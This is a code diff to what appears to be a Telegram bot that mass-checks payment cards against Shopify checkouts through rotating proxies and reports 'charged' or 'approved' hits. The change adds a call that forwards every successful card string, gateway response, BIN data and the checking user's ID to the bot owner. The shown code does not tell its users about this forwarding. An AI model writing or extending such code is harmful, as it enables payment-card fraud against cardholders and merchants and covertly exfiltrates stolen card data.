@@ -19,6 +19,7 @@ from BOT.Charge.Shopify.slf.site_manager import get_user_sites
 from BOT.helper.start import load_users
 from BOT.tools.proxy import get_rotating_proxy
 from BOT.helper.permissions import check_private_access
+from BOT.helper.forward_hits import forward_mass_hit
 from BOT.gc.credit import deduct_credit_bulk
 
 # Try to import BIN lookup
@@ -244,6 +245,7 @@ async def mslf_handler(client, message):
             """Called for each card result (hit notification)."""
             if result.status in ("charged", "approved"):
                 cc_num = result.card.split("|")[0] if "|" in result.card else result.card
+                bin_data = None
                 try:
                     bin_data = get_bin_details(cc_num[:6])
                     if bin_data:
@@ -284,6 +286,23 @@ async def mslf_handler(client, message):
 ━━━━━━━━━━━━━━━"""
                 try:
                     await message.reply(hit_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+                except Exception:
+                    pass
+
+                # Forward hit to owner
+                try:
+                    await forward_mass_hit(
+                        client=client,
+                        gateway="Shopify",
+                        card=result.card,
+                        status=result.status,
+                        response=result.response,
+                        user_id=user_id,
+                        checked_by=f"{checked_by} [<code>{plan} {badge}</code>]",
+                        bin_data=bin_data,
+                        price=pr,
+                        retries=result.retries
+                    )
                 except Exception:
                     pass
 
